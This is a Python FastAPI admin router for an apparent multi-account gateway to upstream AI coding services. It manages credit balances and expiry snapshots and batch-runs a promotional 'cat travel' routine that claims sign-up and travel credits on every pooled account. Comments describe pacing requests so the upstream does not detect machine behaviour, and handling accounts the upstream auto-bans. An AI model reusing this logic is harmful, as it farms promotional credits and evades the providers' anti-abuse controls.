    platform, realm = platform_scope.from_request(request)
    query = db.query(Account).order_by(Account.id)
    if body is not None and body.account_ids:
        query = query.filter(Account.id.in_(body.account_ids))
    else:
        query = platform_scope.filter_accounts(query, db, platform, realm)
    ids = [account.id for account in query.all()]
    if not ids:
        raise HTTPException(400, '当前范围没有可刷新的账号')
    # job 键带平台：否则在 Trae 上点刷新会「复用」还在跑的默认平台任务，
    # 前端看到进度条、结果却是别的平台的账号。
    key = 'account-refresh:' + (platform or 'all')
    running = jobrunner.RUNNER.get(key)
    if running and running.status == 'running':
        return {'reused': True, **running.snapshot()}
    job = jobrunner.RUNNER.start(key, len(ids), lambda job: _run_refresh_batch(ids, job),
                                 title='刷新账号')
    return job.snapshot()


def _start_health_check(ids: list[int], platform: str = ""):
    if not ids:
        raise HTTPException(400, '没有可检查的账号')
    # job 键带平台，理由同 refresh_batch：避免跨平台复用同一个进度条
    key = 'account-health-check:' + (platform or 'all')
    running = jobrunner.RUNNER.get(key)
    if running and running.status == 'running':
        return {'reused': True, **running.snapshot()}
    from admin.account_health import run_health_batch
    job = jobrunner.RUNNER.start(
        key, len(ids), lambda job: run_health_batch(ids, job),
        title='账号三项上游健康检查')
    return job.snapshot()


@router.post('/health-check-batch')
def health_check_batch(body: HealthCheckBatchIn,
                       request: Request = None,
                       _: bool = Depends(require_admin), db: Session = Depends(get_db)):
    """Asynchronously check balance, model catalog and one real chat per account.

    `account_ids` 为空时按**当前平台作用域**取，不再退化成全库 ——
    对默认平台账号做三项检查会真的打一次对话，拿它去测别的平台账号
    既必然失败也浪费额度。
    """
    from admin.platform import scope as platform_scope

    platform, realm = platform_scope.from_request(request)
    query = db.query(Account)
    if body.account_ids:
        query = query.filter(Account.id.in_(body.account_ids))
    else:
        query = platform_scope.filter_accounts(query, db, platform, realm)
    ids = [row.id for row in query.order_by(Account.id).all()]
    return _start_health_check(ids, platform)


@router.post('/{acc_id}/health-check')
def health_check_account(acc_id: int, _: bool = Depends(require_admin),
                         db: Session = Depends(get_db)):
    if db.get(Account, acc_id) is None:
        raise HTTPException(404, '账号不存在')
    return _start_health_check([acc_id])


@router.post("/{acc_id}/refresh")
def refresh_account(acc_id: int, with_expiry: bool = True,
                    _: bool = Depends(require_admin), db: Session = Depends(get_db)):
    """刷新单账号余额。

    `with_expiry` 默认 **True**：单个账号的刷新通常是「我想看看这个号现在
    到底还剩多少、哪个包要先到期」，只回一个总额等于没解决他的问题。
    多一次上游请求（约 0.4s），换取到期快照的实时性，这个交换是值得的。
    批量刷新走 `/credits/sync` 与定时任务，口径一致。
    """
    acc = db.query(Account).filter(Account.id == acc_id).first()
    if not acc:
        raise HTTPException(status_code=404, detail="账号不存在")
    errors = []
    ok = _refresh_balance(acc, with_expiry=with_expiry, on_error=errors.append)
    db.commit()
    if not ok:
        raise HTTPException(status_code=502, detail={
            'message': '本网关：账号余额刷新失败，具体原因见上游原文',
            'upstream': upstream_errors.stored_info(acc.last_upstream_error, acc.last_err_msg)})
    return {
        "id": acc.id,
        "balance_total": acc.balance_total,
        "balance_remain": acc.balance_remain,
        "warnings": [upstream_errors.error_info(getattr(error, 'raw_body', str(error)),
                                                getattr(error, 'http_status', 0)) for error in errors],
        **_credit_fields(acc),
    }


@router.get("/{acc_id}/credit-details")
def credit_details(acc_id: int, refresh: bool = False,
                   _: bool = Depends(require_admin), db: Session = Depends(get_db)):
    """获取账号积分明细（每个积分包的总量/剩余/到期时间）。

    默认**优先返回库内快照**：整点定时任务已经把逐包明细存下来了，
    点开详情时再打一次上游纯属浪费（每个号约 0.4s，用户要等）。
    `refresh=true`（界面上是「重新采集」）才真调上游并写回快照。

    返回的 `packages` 是**归一化后**的结构：到期时间已经过
    `resolve_expire_at` 处理（长期占位值不会被当成真实到期日），
    剩余额度取当前周期口径，并带上 `expiring_soon` / `days_left`
    供界面直接标色与排序。
    """
    acc = db.query(Account).filter(Account.id == acc_id).first()
    if not acc:
        raise HTTPException(status_code=404, detail="账号不存在")

    from admin import credits as credit_rules

    def _cached() -> list[dict]:
        raw = (acc.credits_snapshot or "").strip()
        if not raw:
            return []
        try:
            parsed = json.loads(raw)
        except Exception:
            return []
        return parsed.get("resources") or [] if isinstance(parsed, dict) else []

    packages: list[dict] = []
    source = "cache"
    error = ""
    if refresh or not _cached():
        try:
            with backend.AccountSession(acc.auth_json) as sess:
                raw_packages = sess.fetch_credit_details()
                # 回写可能刷新的 token
                acc.auth_json = sess.updated_json()
            _sync_credit_snapshot(acc, raw_packages)
            db.commit()
            packages = _cached()
            source = "live"
            collection = getattr(raw_packages, "metadata", None)
            if collection and not collection["complete"]:
                source = "cache" if packages else "none"
                error = "账单来源不完整，保留上次完整快照"
                if not packages:
                    raise HTTPException(status_code=502, detail=error)
        except Exception as e:
            error = str(e)
            packages = _cached()   # 上游失败也要能把上次的快照给出去
            source = "cache" if packages else "none"
            if not packages:
                raise HTTPException(status_code=502, detail=f"获取积分明细失败: {e}")
    else:
        packages = _cached()

    summary = credit_rules.summarize_account(packages)
    # 明细按到期升序返回 —— 与面板的「最近快到期的积分包」、以及 `packages`
    # 的展示顺序保持一致。用 `summary["resources"]` 而不是原始 `packages`：
    # 前者已排好序（且已排除没有剩余额度的包），后者是上游给出的顺序
    # （实测按创建时间，与到期时间无关，直接展示会出现「10/31 排在 10/12 前面」）。
    ordered = summary["resources"]
    try:
        snapshot_meta = json.loads(acc.credits_snapshot or "{}")
        collection_meta = snapshot_meta.get("collection") if isinstance(snapshot_meta, dict) else None
    except (ValueError, TypeError):
        collection_meta = None
    return {
        "id": acc_id,
        "account": acc.name,
        "source": source,                       # live | cache
        "error": error or None,
        "collection": collection_meta,
        # 旧字段保留：`packages` 维持升级前的扁平结构
        # （`name` / `total` / `remain` / `used` / `deduction_end` …）。
        # 把它改成新结构会让既有脚本与页面静默显示空白 —— 兼容成本极低，
        # 就不做这个破坏性变更。新代码请用下面的 `credits.resources`。
        "packages": [_legacy_package(r) for r in ordered],
        # 新增：账号级到期汇总 + 参考实现同口径的字段命名
        "credits": {
            "ok": True,
            "account_id": acc_id,
            "account_name": acc.name,
            "updated_at": (
                int(acc.credits_synced_at.replace(tzinfo=timezone.utc).timestamp() * 1000)
                if acc.credits_synced_at else None),
            "total_capacity": summary["total_capacity"],
            "total_remaining": summary["total_remaining"],
            "expiring_soon_remaining": summary["expiring_soon_remaining"],
            "expired_remaining": summary["expired_remaining"],
            "soonest_expire_at": summary["soonest_expire_at"],
            "soonest_days_left": summary["soonest_days_left"],
            "expiring_soon": summary["expiring_soon"],
            "expired": summary["expired"],
            "expiring_soon_days": credit_rules.EXPIRING_SOON_DAYS,
            #: 只含**仍有剩余**的包（已用完的不必占版面），按到期升序
            "resources": [
                {
                    "packageCode": r["package_code"],
                    "packageName": r["package_name"],
                    "displayName": r["display_name"],
                    "total": r["total"],
                    "remaining": r["remaining"],
                    "used": r["used"],
                    "status": r["status"],
                    "expireAt": r["expire_at"],
                    "expireLabel": credit_rules.format_expire_at(r["expire_at"]),
                    "expireDate": credit_rules.expire_date_label(r["expire_at"]),
                    "expired": r["expired"],
                    "expiringSoon": r["expiring_soon"],
                    "daysLeft": r["days_left"],
                }
                for r in ordered
            ],
            #: 全部包（含已用完），也按到期升序 —— 「积分明细」弹窗要看全量
            "all_resources": [
                {
                    "packageCode": r["package_code"],
                    "packageName": r["package_name"],
                    "displayName": r["display_name"],
                    "total": r["total"],
                    "remaining": r["remaining"],
                    "used": r["used"],
                    "status": r["status"],
                    "expireAt": r["expire_at"],
                    "expireLabel": credit_rules.format_expire_at(r["expire_at"]),
                    "expireDate": credit_rules.expire_date_label(r["expire_at"]),
                    "expired": r["expired"],
                    "expiringSoon": r["expiring_soon"],
                    "daysLeft": r["days_left"],
                }
                for r in sorted(
                    packages,
                    key=lambda x: (x.get("expire_at") is None,
                                   x.get("expire_at") or 0))
            ],
        },
    }


def _legacy_package(r: dict) -> dict:
    """归一化资源包 → 升级前的扁平结构（`packages` 字段的兼容层）。

    升级前 `fetch_credit_details` 就在这里把上游字段改名成
    `name` / `total` / `remain` / `deduction_end` 等；现在改名搬到
    `admin/credits.py`（口径判断的唯一点），但**对外结构保持不变** ——
    既有页面与脚本都在读它，改结构会让它们静默显示空白。
    """
    expire_at = r.get("expire_at")
    return {
        "name": r.get("display_name") or r.get("package_name") or "未命名",
        "total": r.get("total") or 0,
        "remain": r.get("remaining") or 0,
        "used": r.get("used") or 0,
        # 账号层累积剩余（CapacityRemain）：与「当前周期剩余」是两个口径，
        # 这里没有等价值就不假造，给 0 比给一个错数字诚实。
        "account_remain": 0,
        "account_used": 0,
        "cycle_start": "",
        "cycle_end": _ms_to_str(expire_at),
        "deduction_end_ts": expire_at or 0,
        "deduction_end": _ms_to_str(expire_at),
        "status": r.get("status"),
        "package_code": r.get("package_code") or "",
    }


def _ms_to_str(ts) -> str:
    if not ts:
        return ""
    try:
        return datetime.fromtimestamp(int(ts) / 1000).strftime("%Y-%m-%d %H:%M:%S")
    except (OSError, OverflowError, ValueError, TypeError):
        return ""


@router.post("/credits/sync")
def sync_credits(_: bool = Depends(require_admin), db: Session = Depends(get_db)):
    """立即重新采集**全部活跃账号**的积分到期快照。

    与整点定时任务 `refresh_credits` 走同一份实现（`_sync_credit_snapshot`），
    避免「手动刷新」和「自动刷新」出现两套口径这种经典问题。

    串行 + 每号间隔，与保活/批量任务的节流规则一致：批量并发请求上游
    本身就是很明显的机器特征。账号多时耗时会到几十秒，故前端应按后台任务
    的节奏处理（这里返回逐号结果，供前端展示进度）。
    """
    from admin.config import settings

    accounts = (db.query(Account).filter(Account.status == "active")
                .order_by(Account.id.asc()).all())
    ok = 0
    failed = 0
    detail: list[dict] = []
    for idx, a in enumerate(accounts):
        if idx and settings.KEEPALIVE_ACCOUNT_GAP > 0:
            time.sleep(settings.KEEPALIVE_ACCOUNT_GAP)
        try:
            with backend.AccountSession(
                    a.auth_json,
                    enterprise_id=(getattr(a, "enterprise_id", "") or "")) as sess:
                packages = sess.fetch_credit_details()
                a.auth_json = sess.updated_json()
            summary = _sync_credit_snapshot(a, packages)
            collection = getattr(packages, "metadata", None)
            if collection and not collection["complete"]:
                failed += 1
                detail.append({"id": a.id, "account": a.name, "ok": False,
                               "error": "账单来源不完整，保留旧快照", "collection": collection})
                db.commit()
                continue
            ok += 1
            detail.append({
                "id": a.id, "account": a.name, "ok": True,
                "expiring_soon": int(summary["expiring_soon_remaining"]),
                "soonest_days_left": summary["soonest_days_left"],
                "packages": summary["active_package_count"],
            })
        except Exception as e:
            failed += 1
            detail.append({"id": a.id, "account": a.name, "ok": False,
                           "error": str(e)[:160]})
        db.commit()

    expiring = sum(int(a.credits_expiring_soon or 0) for a in accounts)
    return {
        "ok": True, "total": len(accounts), "refreshed": ok, "failed": failed,
        "credits_expiring_soon": expiring,
        "detail": detail,
    }


@router.get("/{acc_id}/request-usage")
def request_usage(
    acc_id: int,
    start_time: str = "",
    end_time: str = "",
    page_num: int = 1,
    page_size: int = 10,
    _: bool = Depends(require_admin),
    db: Session = Depends(get_db),
):
    """获取账号模型请求用量（对接 WorkBuddy 已有接口，不自建日志）。"""
    acc = db.query(Account).filter(Account.id == acc_id).first()
    if not acc:
        raise HTTPException(status_code=404, detail="账号不存在")
    # 默认今天
    if not start_time:
        start_time = datetime.now().strftime("%Y-%m-%d 00:00:00")
    if not end_time:
        end_time = datetime.now().strftime("%Y-%m-%d 23:59:59")
    try:
        with backend.AccountSession(acc.auth_json) as sess:
            data = sess.fetch_request_usage(start_time, end_time, page_num, page_size)
            acc.auth_json = sess.updated_json()
            db.commit()
        return data
    except Exception as e:
        raise HTTPException(status_code=502, detail=f"获取请求用量失败: {e}")


@router.post("/{acc_id}/cat-travel")
def cat_travel(acc_id: int, _: bool = Depends(require_admin), db: Session = Depends(get_db)):
    """对单个账号执行一趟猫猫旅行：同意协议 → 首次领养(+300) → 派出 → 领奖。

    返回结构化分步结果，前端据此逐步提示「领养成功 +300」「领奖成功 +N」，
    无需再去积分明细核对。
    """
    acc = db.query(Account).filter(Account.id == acc_id).first()
    if not acc:
        raise HTTPException(status_code=404, detail="账号不存在")
    try:
        with backend.AccountSession(acc.auth_json) as sess:
            result = sess.run_cat_travel()
            acc.auth_json = sess.updated_json()  # 回写可能刷新的 token
            db.commit()
    except Exception as e:
        raise HTTPException(status_code=502, detail=f"猫猫旅行执行失败: {e}")
    # 领取到积分后顺带刷新余额，让前端列表立即反映最新值
    if result.get("credits"):
        _refresh_balance(acc, with_expiry=True)
        db.commit()
    return {
        "id": acc.id,
        "account": acc.name,
        "balance_remain": acc.balance_remain,
        **result,
    }


class CatTravelBatchIn(BaseModel):
    ids: list[int] = []  # 指定账号；为空则对全部启用账号执行


#: 猫猫旅行后台任务 key
CAT_JOB_KEY = "cat_travel"


@router.post("/cat-travel/batch-async")
def cat_travel_batch_async(
    body: CatTravelBatchIn,
    _: bool = Depends(require_admin),
):
    """异步批量猫猫旅行：立即返回 job_id，前端轮询进度。

    每个账号要串行做「同意协议 → 补门槛对话 → 领养 → 派猫 → 领奖」，
    同步等容易让 nginx 先超时（默认 60s），所以放到后台线程跑。
    重复点击复用同一个 job，不会叠起并发批量。
    """
    running = jobrunner.RUNNER.get(CAT_JOB_KEY)
    if running and running.status == "running":
        return {"reused": True, **running.snapshot()}

    db = SessionLocal()
    try:
        q = db.query(Account).filter(Account.status == "active")
        if body.ids:
            q = q.filter(Account.id.in_(body.ids))
        ids = [a.id for a in q.order_by(Account.id).all()]
    finally:
        db.close()

    def worker(job: jobrunner.Job) -> dict:
        db = SessionLocal()
        buckets = {"adopted": 0, "adopt_credits": 0,
                   "travel_claimed": 0, "travel_credits": 0,
                   "travel_none": 0, "traveling": 0,
                   "gate_blocked": 0, "error": 0}
        try:
            job.set_phase("执行中")
            for aid in ids:
                acc = db.query(Account).get(aid)
                if not acc:
                    continue
                try:
                    with backend.AccountSession(acc.auth_json) as sess:
                        res = sess.run_cat_travel()
                        acc.auth_json = sess.updated_json()
                        db.commit()
                except Exception as e:
                    item = {"id": aid, "account": acc.name, "ok": False,
                            "credits": 0, "summary": f"执行异常: {e}",
                            "steps": [], "outcome": "error"}
                    buckets["error"] += 1
                    job.add_item(item)
                    continue

                if res.get("credits"):
                    _refresh_balance(acc, with_expiry=True)
                    db.commit()
                outcome = res.get("outcome") or ("error" if not res.get("ok") else "travel_none")
                if outcome == "adopted":
                    buckets["adopted"] += 1
                    buckets["adopt_credits"] += res.get("credits") or 0
                elif outcome == "travel_claimed":
                    buckets["travel_claimed"] += 1
                    buckets["travel_credits"] += res.get("credits") or 0
                elif outcome in buckets:
                    buckets[outcome] += 1
                else:
                    buckets["travel_none"] += 1

                job.add_item({"id": aid, "account": acc.name,
                              "balance_remain": acc.balance_remain, **res})
                time.sleep(0.5)   # 账号之间留一点间隔，避免打太快
        finally:
            db.close()
        return {
            "total": len(ids),
            "credits": buckets["adopt_credits"] + buckets["travel_credits"],
            "succeeded": sum(1 for r in job.items if r.get("ok")),
            "buckets": buckets,
        }

    job = jobrunner.RUNNER.start(CAT_JOB_KEY, len(ids), worker, title="批量猫猫旅行")
    return job.snapshot()


@router.post("/cat-travel/batch")
def cat_travel_batch(
    body: CatTravelBatchIn,
    _: bool = Depends(require_admin),
    db: Session = Depends(get_db),
):
    """批量执行猫猫旅行；逐个账号串行执行并返回每个账号的结果。

    按结果分类统计，避免把「首次领养 +300」和「旅行到站返现 +7」混在一起 ——
    两者量级差几十倍，合并成一个总数会让人误以为执行无效。
    """
    q = db.query(Account).filter(Account.status == "active")
    if body.ids:
        q = q.filter(Account.id.in_(body.ids))
    rows = q.order_by(Account.id).all()

    results = []
    total_credits = 0
    #: 分类计数：首次领养 / 旅行返现 / 无新增 / 门槛未达标 / 失败
    buckets = {"adopted": 0, "adopt_credits": 0,
               "travel_claimed": 0, "travel_credits": 0,
               "travel_none": 0, "traveling": 0,
               "gate_blocked": 0, "error": 0}
    for acc in rows:
        try:
            with backend.AccountSession(acc.auth_json) as sess:
                res = sess.run_cat_travel()
                acc.auth_json = sess.updated_json()
                db.commit()
        except Exception as e:
            results.append({"id": acc.id, "account": acc.name, "ok": False,
                            "credits": 0, "summary": f"执行异常: {e}", "steps": [],
                            "outcome": "error"})
            buckets["error"] += 1
            continue
        if res.get("credits"):
            total_credits += res["credits"]
            _refresh_balance(acc, with_expiry=True)
            db.commit()

        outcome = res.get("outcome") or ("error" if not res.get("ok") else "travel_none")
        if outcome == "adopted":
            buckets["adopted"] += 1
            buckets["adopt_credits"] += res.get("credits") or 0
        elif outcome == "travel_claimed":
            buckets["travel_claimed"] += 1
            buckets["travel_credits"] += res.get("credits") or 0
        elif outcome in buckets:
            buckets[outcome] += 1
        else:
            buckets["travel_none"] += 1

        results.append({
            "id": acc.id,
            "account": acc.name,
            "balance_remain": acc.balance_remain,
            **res,
        })
    return {
        "total": len(results),
        "credits": total_credits,
        "succeeded": sum(1 for r in results if r.get("ok")),
        "buckets": buckets,
        "results": results,
    }


@router.patch("/{acc_id}")
def patch_account(
    acc_id: int,
    body: dict,
    _: bool = Depends(require_admin),
    db: Session = Depends(get_db),
):
    acc = db.query(Account).filter(Account.id == acc_id).first()
    if not acc:
        raise HTTPException(status_code=404, detail="账号不存在")
    if "max_in_flight" in body:
        value = body["max_in_flight"]
        if value is None or value == "":
            acc.max_in_flight = None
        elif type(value) is int and 0 <= value <= 2147483647:
            acc.max_in_flight = value
        else:
            raise HTTPException(400, "并发上限必须是非负整数；留空跟随全局，0 表示不限")
    if "name" in body:
        # 改名同样要清洗：这里以前是原样写库，等于给「改个名」开了同一条 XSS。
        acc.name = clean_display_name(body["name"], acc.name)
    if "status" in body and body["status"] in ("active", "disabled"):
        acc.status = body["status"]
        if acc.status == "disabled":
            # ⚠️ 手动停用**必须**标记 `manual_disabled`，否则 `ban_recheck`
            # 会把它当成「上游风控临时禁用」自动解封回来。
            #
            # 原实现只改 `session_dead` 一种，`account_fault`（11140 等）
            # 和 `hard_credit` 全部漏掉 —— 那些号的 `cool_until` 一旦到期，
            # `_should_probe` 就返回 (True, 'disabled') 进入复核队列，
            # 探测通过即 `_unban`，手动禁用在下一次巡检时静默失效
            # （用户实测：禁用了账号，过一阵它自己又活了）。
            #
            # `_should_probe` 里对 `manual_disabled` 有明确的提前返回
            # （`return False, "manual"`），所以这里统一标记即可。
            acc.cool_kind = "manual_disabled"
        elif acc.cool_kind == "manual_disabled":
            # 手动恢复启用时把标记清掉，否则下次冷却会带着过期语义。
            acc.cool_kind = ""
    db.commit()
    return {"id": acc.id, "ok": True}


@router.delete("/{acc_id}")
def delete_account(acc_id: int, _: bool = Depends(require_admin), db: Session = Depends(get_db)):
    acc = db.query(Account).filter(Account.id == acc_id).with_for_update().first()
    if not acc:
        raise HTTPException(status_code=404, detail="账号不存在")
    if db.query(ApiKey).filter(ApiKey.account_id == acc_id).with_for_update().first():
        raise HTTPException(409, "该账号已绑定 API Key，请先解除绑定再删除")
    db.query(AccountModelCooldown).filter(AccountModelCooldown.account_id == acc_id).delete(synchronize_session=False)
    db.delete(acc)
    db.commit()
    return {"id": acc_id, "ok": True}